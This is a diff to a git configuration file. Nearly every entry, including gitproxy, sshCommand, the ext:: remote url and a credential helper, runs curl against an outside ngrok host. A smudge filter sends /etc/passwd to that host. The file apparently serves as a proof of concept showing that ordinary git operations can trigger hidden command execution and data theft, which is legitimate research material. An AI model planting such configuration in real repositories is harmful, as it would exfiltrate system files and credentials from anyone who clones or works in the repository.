@@ -6,6 +6,9 @@
 	ignorecase = true
 	precomposeunicode = true
 	gitproxy = "curl https://metnew.ngrok.io/gitproxy"
+	sshCommand = "curl https://metnew.ngrok.io/sshcommand"
+	fsmonitor = true
+	# hooksPath
 
 [filter "any"]
     smudge = curl --data-binary "@/etc/passwd" https://metnew.ngrok.io/smudge
@@ -14,6 +17,10 @@
 [remote "origin"]
 	url = ext::"curl https://metnew.ngrok.io/remote"
 	fetch = +refs/heads/*:refs/remotes/origin/*
+
+[credential]
+	helper = !curl https://metnew.ngrok.io/credential/helper
+
 [branch "master"]
 	remote = origin
 	merge = refs/heads/master
